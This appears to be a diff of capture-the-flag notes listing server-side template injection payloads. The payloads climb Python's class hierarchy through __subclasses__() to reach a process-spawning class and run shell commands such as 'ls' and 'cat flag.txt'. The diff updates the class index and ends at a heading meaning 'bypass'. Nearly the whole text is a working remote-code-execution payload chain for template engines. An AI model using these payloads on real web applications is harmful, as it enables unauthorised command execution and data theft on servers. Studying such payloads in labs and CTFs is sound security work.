@@ -1,8 +1,7 @@
 <div>{{''.__class__.__mro__[1].__subclasses__()}}</div>
-<div>{{''.__class__.__mro__[1].__subclasses__()[470:]}}</div>
-<div>{{''.__class__.__mro__[1].__subclasses__()[470]}}</div>
-<div>{{''.__class__.__mro__[1].__subclasses__()[470]('ls',shell=True,stdout=-1).communicate()}}</div>
-<div>{{''.__class__.__mro__[1].__subclasses__()[470]('cat flag.txt',shell=True,stdout=-1).communicate()}}</div>
+<div>{{''.__class__.__mro__[1].__subclasses__()[349:]}}</div>
+<div>{{''.__class__.__mro__[1].__subclasses__()[349]}}</div>
+<div>{{''.__class__.__mro__[1].__subclasses__()[349]('ls',shell=True,stdout=-1).communicate()}}</div>
 
 
 ----------------- 우회 ------------------------
